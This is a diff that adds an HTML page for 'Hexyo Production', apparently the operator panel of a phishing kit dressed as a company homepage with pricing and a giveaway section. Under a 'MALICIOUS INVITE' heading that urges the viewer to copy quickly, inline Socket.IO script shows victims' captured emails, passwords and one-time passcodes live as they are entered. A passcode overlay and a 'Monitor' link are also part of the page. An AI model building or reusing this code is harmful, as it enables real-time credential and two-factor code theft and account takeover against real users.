@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en"> <!-- REFINEMENT: Added lang="en" -->
+
+<head>
+  <meta charset="UTF-8"> <!-- REFINEMENT: Added charset -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta name="theme-color" content="#000000">
+  <title>Home | Hexyo Production</title>
+  <meta name="description" content="Welcome to Hexyo Production web page">
+  <link rel="canonical" href="https://hexyoproduction.onrender.com">
+  <meta property="og:title" content="SignUp | SignIn to the page">
+  <meta property="og:description" content="SignUp for an account for high privacy">
+  <meta property="og:image"
+    content="https://assets.onecompiler.app/43haghwug/43hexzw97/Screenshot%202025-05-12%20002252.png">
+  <meta property="og:image:width" content="1600">
+  <meta property="og:image:height" content="900">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Hacking | Web design">
+  <meta name="twitter:description"
+    content="We blend creativity, technology, and innovation to deliver cutting-edge digital solutions">
+  <meta name="twitter:image"
+    content="https://assets.onecompiler.app/43haghwug/43hexzw97/Screenshot%202025-05-12%20002252.png">
+  <meta name="twitter:image:width" content="1600">
+  <meta name="twitter:image:height" content="900">
+
+  <link rel="icon" href="https://uploads.onecompiler.io/435v654fz/43physwvv/HXLOGO2%20bg.png" type="image/png">
+  <link rel="stylesheet" href="HEXYO.css">
+  <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- REFINEMENT NOTE: Inline styles moved to HEXYO.css -->
+</head>
+
+<body>
+
+  <section class="content blurred" id="main-content">
+    <!-- =================================================================================================================================================================== -->
+    <!-- Header -->
+    <header class="bg-black shadow-md fixed w-full z-10 top-0 left-0 text-white">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center py-4">
+          <!-- Logo -->
+          <div class="flex items-center">
+            <img src="https://uploads.onecompiler.io/435v654fz/43physwvv/HXLOGO2%20bg.png" alt="Logo" class="h-6 w-auto" />
+            <span class="ml-2 font-bold text-lg text-white">HexyoProduction</span>
+          </div>
+
+          <!-- Nav Links -->
+          <nav class="hidden md:flex space-x-6 text-sm font-medium text-white">
+            <a href="#" class="hover:text-blue-400">Products</a>
+            <a href="ABOUT.html" class="hover:text-blue-400">About Us</a>
+            <a href="#" class="hover:text-blue-400">Pricing</a>
+            <a href="#" class="hover:text-blue-400">Contact</a>
+            <a href="MASTER.html" class="hover:text-blue-400">Monitor</a>
+            <a href="SignIn.html" class="hover:text-blue-400">Login</a>
+          </nav>
+
+          <!-- CTA Button -->
+          <div class="hidden md:flex">
+            <a href="CreateAccount.html"
+              class="bg-blue-500 hover:bg-blue-600 text-white text-sm px-4 py-2 rounded-full transition-all duration-200">Create
+              Account</a>
+          </div>
+
+          <!-- Mobile Menu Button -->
+          <div class="md:hidden">
+            <button id="menu-btn" class="text-white focus:outline-none">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Mobile Dropdown Menu -->
+      <div id="mobile-menu" class="md:hidden hidden px-4 pb-4 space-y-2 bg-black shadow-md text-white">
+        <a href="#" class="hover:text-blue-400">Products</a>
+        <a href="#" class="hover:text-blue-400">About Us</a>
+        <a href="#" class="hover:text-blue-400">Pricing</a>
+        <a href="#" class="hover:text-blue-400">Contact</a>
+        <a href="#" class="hover:text-blue-400">Monitor</a>
+        <a href="#" class="hover:text-blue-400">Login</a>
+        <a href="#"
+          class="block bg-blue-500 hover:bg-blue-600 text-white text-center rounded-full py-2 transition-all duration-200">Create
+          Account</a>
+      </div>
+    </header>
+    <br>
+    <!-- =================================================================================================================================================================== -->
+
+
+    <!-- =================================================================================================================================================================== -->
+    <!-- banner -->
+    <div id="banner" class="relative overflow-hidden w-[100vw] h-[85vh]">
+      <!-- Inner Slider -->
+      <div id="slider" class="flex w-[100%] h-full slider">
+        <!-- Slides -->
+        <div class="w-full h-full flex-shrink-0 flex items-center justify-center">
+          <img src="https://uploads.onecompiler.io/435v654fz/439z539cu/NIXB1.png" class="w-full h-full object-cover"
+            alt="Slide 1" />
+        </div>
+        <div class="w-full h-full flex-shrink-0 flex items-center justify-center">
+          <img src="https://uploads.onecompiler.io/435v654fz/439z539cu/NIXB2.png" class="w-full h-full object-cover"
+            alt="Slide 2" />
+        </div>
+        <div class="w-full h-full flex-shrink-0 flex items-center justify-center">
+          <img src="https://uploads.onecompiler.io/435v654fz/439z539cu/NIXB3.png" class="w-full h-full object-cover"
+            alt="Slide 3" />
+        </div>
+        <div class="w-full h-full flex-shrink-0 flex items-center justify-center">
+          <img src="https://uploads.onecompiler.io/435v654fz/439z539cu/NIXB4.png" class="w-full h-full object-cover"
+            alt="Slide 4" />
+        </div>
+      </div>
+
+      <!-- Arrows -->
+      <button onclick="prevSlide()"
+        class="absolute top-1/2 left-4 transform -translate-y-1/2 bg-white text-black p-2 rounded-full z-10 hover:bg-gray-300">
+        &#10094;
+      </button>
+      <button onclick="nextSlide()"
+        class="absolute top-1/2 right-4 transform -translate-y-1/2 bg-white text-black p-2 rounded-full z-10 hover:bg-gray-300">
+        &#10095;
+      </button>
+
+      <!-- Dots -->
+      <div class="absolute bottom-4 left-1/2 transform -translate-x-1/2 flex gap-2 z-10">
+        <span onclick="goToSlide(0)" class="dot w-3 h-3 bg-white rounded-full opacity-50 cursor-pointer"></span>
+        <span onclick="goToSlide(1)" class="dot w-3 h-3 bg-white rounded-full opacity-50 cursor-pointer"></span>
+        <span onclick="goToSlide(2)" class="dot w-3 h-3 bg-white rounded-full opacity-50 cursor-pointer"></span>
+        <span onclick="goToSlide(3)" class="dot w-3 h-3 bg-white rounded-full opacity-50 cursor-pointer"></span>
+      </div>
+    </div>
+    <!-- =================================================================================================================================================================== -->
+
+    <!-- =================================================================================================================================================================== -->
+    <br>
+    <div class="widget">
+      <h1 class="invite">MALICIOUS INVITE</h1>
+      <p>THIS IS A LIVE SCREEN. COPY AND PASTE AS QUICK AS POSIBLE</p>
+
+      <div id="displayArea"></div>
+      <div id="submitMessage"></div>
+    </div>
+    <br>
+    <!-- =================================================================================================================================================================== -->
+
+
+
+    <!-- =================================================================================================================================================================== -->
+    <div class="card1-container">
+      <div class="card1">
+        <img src="https://uploads.onecompiler.io/42n876cmq/439zg26ar/MESSIAH.FRI.FEB.22X%20copy.png" alt="Yah Shihrah"
+          onclick="openPreview(this)">
+      </div>
+      <div class="card1">
+        <img src="https://uploads.onecompiler.io/42n876cmq/439zg26ar/SP.THR.JAN.30X.png" alt="Big Time"
+          onclick="openPreview(this)">
+      </div>
+      <div class="card1">
+        <img src="https://uploads.onecompiler.io/42n876cmq/43f654sv9/HX.MAR.30X.png" alt="Mague"
+          onclick="openPreview(this)">
+      </div>
+      <div class="card1">
+        <img src="https://uploads.onecompiler.io/42n876cmq/439zg26ar/KS.SUN.FEB.9.25X%20copy.png" alt="Mugithi"
+          onclick="openPreview(this)">
+      </div>
+    </div>
+
+    <!-- Image Preview Lightbox -->
+    <div class="preview-overlay" id="previewOverlay" onclick="closePreview()">
+      <img id="previewImage" src="" alt="Preview">
+    </div>
+    <!-- =================================================================================================================================================================== -->
+
+    <!-- =================================================================================================================================================================== -->
+    <section class="explorer-section">
+      <h2>@hexyoproduction</h2>
+      <button class="follow-btn">Follow us</button>
+      <p class="description">
+        Are you an <strong>explorer</strong> at heart, always seeking new experiences?
+        Join us at <strong>HexyoProduction</strong> as we embark on exciting journeys together.
+        Share your incredible moments with HexyoProduction by posting your photos on Instagram using the hashtag
+        <span class="hashtag">#hexyoproduction</span> and tagging <strong>@hexyoproduction</strong>.
+        By doing so, you stand a chance to receive a special gift from us.
+        Let's <strong>Keep Exploring</strong> and creating memories with <strong>oraimo</strong>!
+      </p>
+
+      <div class="card-container">
+        <div class="card">
+          <img src="https://uploads.onecompiler.io/42n876cmq/43f654sv9/HX.MAR.30X.png" alt="Speaker">
+          <p>LIGHT UP THE FUN</p>
+        </div>
+        <div class="card">
+          <img src="https://uploads.onecompiler.io/42n876cmq/43f654sv9/PAX1.png" alt="AI Watch">
+          <p>UNIQUE HACK TOOL</p>
+        </div>
+        <div class="card">
+          <img src="https://uploads.onecompiler.io/42n876cmq/43f654sv9/JN.APR.01X.png" alt="Watch">
+          <p>ELEGANT PROFILE</p>
+        </div>
+        <div class="card">
+          <img src="https://uploads.onecompiler.io/42n876cmq/43f654sv9/SAFARICOM.png" alt="Power Bank">
+          <p>UNIVERSAL CREDIT</p>
+        </div>
+      </div>
+
+      <div class="subscribe">
+        <p><strong>Subscribe now and earn 100 points!</strong></p>
+        <small>Get the Latest HexyoProduction News and Giveaways</small><br>
+        <input type="email" placeholder="Enter your email address" id="email">
+        <button onclick="subscribe()">🔔</button>
+      </div>
+    </section>
+    <!-- =================================================================================================================================================================== -->
+
+    <!-- =================================================================================================================================================================== -->
+    <section class="pricing-container">
+      <div class="pricing-card basic">
+        <h2>Basic</h2>
+        <ul>
+          <li><strong>10GB</strong> Storage</li>
+          <li><strong>10</strong> Emails</li>
+          <li><strong>10</strong> Domains</li>
+          <li><strong>Endless</strong> Support</li>
+        </ul>
+        <div class="price">$10 <span>/ month</span></div>
+        <button class="signup-btn">Sign Up</button>
+      </div>
+
+      <div class="pricing-card pro highlighted">
+        <h2>Pro</h2>
+        <ul>
+          <li><strong>25GB</strong> Storage</li>
+          <li><strong>25</strong> Emails</li>
+          <li><strong>25</strong> Domains</li>
+          <li><strong>Endless</strong> Support</li>
+        </ul>
+        <div class="price">$25 <span>/ month</span></div>
+        <button class="signup-btn">Sign Up</button>
+      </div>
+
+      <div class="pricing-card premium">
+        <h2>Premium</h2>
+        <ul>
+          <li><strong>50GB</strong> Storage</li>
+          <li><strong>50</strong> Emails</li>
+          <li><strong>50</strong> Domains</li>
+          <li><strong>Endless</strong> Support</li>
+        </ul>
+        <div class="price">$50 <span>/ month</span></div>
+        <button class="signup-btn">Sign Up</button>
+      </div>
+    </section>
+    <!-- =================================================================================================================================================================== -->
+
+    <!-- =================================================================================================================================================================== -->
+    <div class="banner2"></div>
+    <br>
+    <section class="wrapper">
+      <div class="image-grid">
+        <div class="image-box"><img
+            src="https://uploads.onecompiler.io/435v654fz/43gn8eejc/1000_F_664273322_xHHREhkbz1aA3hOHB2c0XHPP4PoRnL2v.jpg"
+            alt="Image 1"></div>
+        <div class="image-box"><img src="https://uploads.onecompiler.io/435v654fz/439z539cu/NIXB4.png" alt="Image 2">
+        </div>
+        <div class="image-box"><img
+            src="https://uploads.onecompiler.io/435v654fz/43dn9wdy2/globalpay-app-design+(2).png"></div>
+        <div class="image-box"><img src="https://uploads.onecompiler.io/435v654fz/43gna9e28/VENUS.png" alt="Image 4">
+        </div>
+      </div>
+    </section>
+    <!-- =================================================================================================================================================================== -->
+
+    <!-- =================================================================================================================================================================== -->
+    <!-- Footer -->
+    <footer class="bg-black text-white text-sm pt-10 pb-4">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex flex-col md:flex-row md:justify-between md:items-center border-b border-gray-700 pb-6">
+          <div class="mb-6 md:mb-0">
+            <h2 class="font-bold text-lg mb-2">FOLLOW US</h2>
+            <div class="flex space-x-4">
+              <a href="#"><img
+                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png"
+                  class="w-5 h-5" alt="Instagram" /></a>
+              <a href="#"><img src="https://www.svgrepo.com/show/448224/facebook.svg" class="w-5 h-5"
+                  alt="Facebook" /></a>
+              <a href="#"><img src="https://i.pinimg.com/736x/3a/36/20/3a36206f35352b4230d5fc9f17fcea92.jpg"
+                  class="w-5 h-5" alt="YouTube" /></a>
+              <a href="#"><img src="https://i.pinimg.com/564x/31/90/a8/3190a844b43ee96d636e62724d252ee6.jpg"
+                  class="w-5 h-5" alt="TikTok" /></a>
+              <a href="#"><img src="https://freepnglogo.com/images/all_img/1707222563twitter-logo-png.png"
+                  class="w-5 h-5" alt="Twitter" /></a>
+            </div>
+          </div>
+          <div class="text-left md:text-right">
+            <p class="mb-2 font-semibold">Download HexyoProduction App</p>
+            <div class="flex space-x-4">
+              <a href="#"><img class="h-10"
+                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/512px-Google_Play_Store_badge_EN.svg.png"
+                  alt="Google Play" /></a>
+              <a href="#"><img class="h-10"
+                  src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg"
+                  alt="App Store" /></a>
+            </div>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-8 py-10 text-gray-300">
+          <div>
+            <h3 class="text-white font-bold mb-4">Customer Service:::</h3>
+            <p>Service Hours<br>Monday – Friday 9AM to 6PM</p>
+            <p class="mt-2">Phone: 0701 249 404 / 0797 674 560<br>
+              Whatsapp: 0701 249 404 / 0797 674 560<br>
+              Email: <a href="mailto:hexyoproduction25@gmail.com" class="text-blue-400">hexyoproduction25@gmail.com</a>
+            </p>
+          </div>
+          <div>
+            <h3 class="text-white font-bold mb-4">About HexyoProduction:::</h3>
+            <ul class="space-y-2">
+              <li><a href="#" class="hover:text-white">About Us</a></li>
+              <li><a href="#" class="hover:text-white">Where to Buy</a></li>
+              <li><a href="#" class="hover:text-white">Explorer Points Program</a></li>
+              <li><a href="#" class="hover:text-white">O-CLUB</a></li>
+              <li><a href="#" class="hover:text-white">Contact Us</a></li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="text-white font-bold mb-4">Terms:::</h3>
+            <ul class="space-y-2">
+              <li><a href="#" class="hover:text-white">Warranty</a></li>
+              <li><a href="#" class="hover:text-white">Shipping & Delivery</a></li>
+              <li><a href="#" class="hover:text-white">Return & Refund Policy</a></li>
+              <li><a href="#" class="hover:text-white">Terms & Conditions</a></li>
+              <li><a href="#" class="hover:text-white">Privacy Policy</a></li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="text-white font-bold mb-4">Get Help:::</h3>
+            <ul class="space-y-2">
+              <li><a href="#" class="hover:text-white">Online Shopping Guide</a></li>
+              <li><a href="#" class="hover:text-white">Track Order</a></li>
+              <li><a href="#" class="hover:text-white">Visit Carlcare</a></li>
+              <li><a href="#" class="hover:text-white">Product Authentication</a></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="text-center border-t border-gray-700 pt-4 text-gray-400 text-xs">
+        <p class="mb-1 font-semibold text-white text-lg">HexyoProduction</p>
+        <p>© 2020–2025 HexyoProduction Copyright.</p>
+      </div>
+    </footer>
+    <!-- =================================================================================================================================================================== -->
+  </section>
+
+
+  <div class="overlay" id="overlay">
+    <div id="popup" class="popup active">
+      <!-- REFINEMENT NOTE: 'active' class might be controlled by JS. Original has it here. -->
+      <p id="error-message" class="error-message">ENTER YOUR SECRITY PASSCODE</p>
+      <div class="otp-container">
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 1">
+        <!-- REFINEMENT: Added aria-label -->
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 2">
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 3">
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 4">
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 5">
+        <input type="text" class="otp-input" maxlength="1" aria-label="Passcode digit 6">
+      </div>
+      <div class="result" id="resultBox"></div>
+    </div>
+  </div>
+
+  <script>
+    // REFINEMENT NOTE: This inline script handles Socket.IO events for HEXYO.html.
+    // It's kept inline for simplicity as per original structure, but for larger apps,
+    // this would ideally be in HEXYO.js.
+    const socket = io();
+    const displayArea = document.getElementById("displayArea");
+    const submitMessage = document.getElementById("submitMessage");
+
+    // Store current displayed data to avoid full re-render if not needed
+    let currentDisplayData = {
+      username: '',
+      password: '',
+      otp: ''
+    };
+
+    function updateDisplayArea() {
+      let html = '';
+      if (currentDisplayData.username) {
+        html += `<p>Email: ${escapeHTML(currentDisplayData.username)}</p>`;
+      }
+      if (currentDisplayData.password) {
+        html += `<p>Password: ${escapeHTML(currentDisplayData.password)}</p>`;
+      }
+      if (currentDisplayData.otp) {
+        html += `<p>OTP: ${escapeHTML(currentDisplayData.otp)}</p>`;
+      }
+      displayArea.innerHTML = html || '<p>Waiting for data...</p>';
+    }
+
+    // Helper to prevent XSS if data were ever to contain HTML characters
+    function escapeHTML(str) {
+      const p = document.createElement('p');
+      p.appendChild(document.createTextNode(str));
+      return p.innerHTML;
+    }
+
+    socket.on("display", (data) => {
+      if (data && data.field) {
+        switch (data.field) {
+          case "username":
+            currentDisplayData.username = data.value;
+            break;
+          case "password":
+            currentDisplayData.password = data.value;
+            break;
+          case "otp":
+            currentDisplayData.otp = data.value;
+            break;
+        }
+        updateDisplayArea();
+      }
+    });
+
+    socket.on("submitted", (data) => {
+      if (data && data.username && data.password) {
+        submitMessage.innerHTML = `
+            <br>
+            <p class="gold">Sign In button clicked</p>
+            <p class="gold">My Email is '${escapeHTML(data.username)}' and my password is '${escapeHTML(data.password)}'</p>
+            <p class="gold">Thank you for your help</p>
+        `;
+      } else {
+        submitMessage.innerHTML = '<p class="gold">Submission data incomplete.</p>';
+      }
+    });
+
+    // Initial call to set "Waiting for data..." or clear if needed
+    updateDisplayArea();
+  </script>
+
+  <script src="HEXYO.js"></script>
+</body>
+
+</html>
